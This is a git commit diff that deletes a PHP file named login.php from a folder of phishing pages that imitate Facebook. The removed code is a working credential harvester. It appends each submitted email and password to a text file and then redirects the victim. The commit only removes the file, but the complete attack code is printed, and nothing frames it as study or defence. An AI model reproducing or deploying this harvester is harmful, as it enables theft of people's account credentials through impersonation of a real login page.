d021454692c0eaf8b805cbae7dfaa6acf06b8180
gamingflexer <50608241+gamingflexer@users.noreply.github.com>
2021-12-07 15:09:55 +0530

    cleN

--- Hacking/Phishing - Pages - Link/Websites/Facebook/login.php
+++
@@ -1,5 +0,0 @@
-<?php # DO NOT EDIT/TAMPER WITH THIS FILE #
-			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $_POST['email'] . " ]   " . " " . "[ PASSWORD: " . " " . $_POST['pass'] . " ]\n", FILE_APPEND);
-  			header('Location: <REDIRECT>');
-			exit();
-?>
